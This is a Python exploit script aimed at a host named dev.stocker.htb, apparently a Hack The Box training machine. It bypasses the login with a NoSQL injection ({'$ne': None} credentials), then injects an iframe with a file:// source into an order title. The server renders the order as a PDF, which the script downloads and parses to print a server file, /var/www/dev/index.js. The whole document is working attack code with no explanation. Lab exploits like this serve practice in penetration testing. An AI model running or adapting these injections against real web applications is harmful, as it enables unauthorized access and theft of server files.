import requests
from tika import parser


BASE_URL = "http://dev.stocker.htb"


INFO = '\033[94m'
SUCCESS = '\033[92m'
ERROR = '\033[91m'
RESET = '\033[0m'

def status(txt: str, prefix=""):
    print(f"{INFO}[*] {txt}{RESET}")

def success(txt: str, prefix=""):
    print(f"{SUCCESS}[+] {txt}{RESET}")

def error(txt: str, prefix=""):
    print(f"{ERROR}[-] {txt}{RESET}")

def read_file(path_to_file):
    """Read file from server"""
    session = requests.session()
    session.get(BASE_URL)

    # Nosql injection to bypass login
    status("Attempt to log in.")
    payload = {"username": {"$ne": None}, "password": {"$ne": None} }
    res = session.post(BASE_URL+"/login", json=payload)
    assert res.status_code == 200, "Login failed"
    success("Logged in successfully.")

    # Submit faked order
    status("Extracting file " + path_to_file)
    payload = f'<iframe src=file://{path_to_file} width="1000" height="1000"></iframe>'
    begin = "START_OF_DATA"
    end = "END_OF_DATA"
    basket = {
        "basket": [
            {
                "_id": "638f116eeb060210cbd83a8d",
                "title": begin+payload+end,
                "description":"It's a red cup.",
                "image":"red-cup.jpg",
                "price":32,
                "currentStock":4,
                "__v":0,
                "amount":1
            }
        ]
    }
    res = session.post(BASE_URL+"/api/order", json=basket)
    assert res.status_code == 200, "Order failed"

    # Receive rendered pdf
    status("Loading PDF...")
    order_id = res.json()["orderId"]
    res = session.get(BASE_URL+f"/api/po/{order_id}")
    assert res.status_code == 200, "PDF failed"
    with open("result.pdf", "wb") as f:
        f.write(res.content)
    success("PDF received.")

    # Retrieve and parse data
    raw = parser.from_file('result.pdf')
    text = raw['content']
    start_index = text.find(begin) + len(begin)
    end_index = text.find(end)
    text = text[start_index:end_index]
    success("Extracted data successfully:")
    print(text)
    return text


read_file("/var/www/dev/index.js")


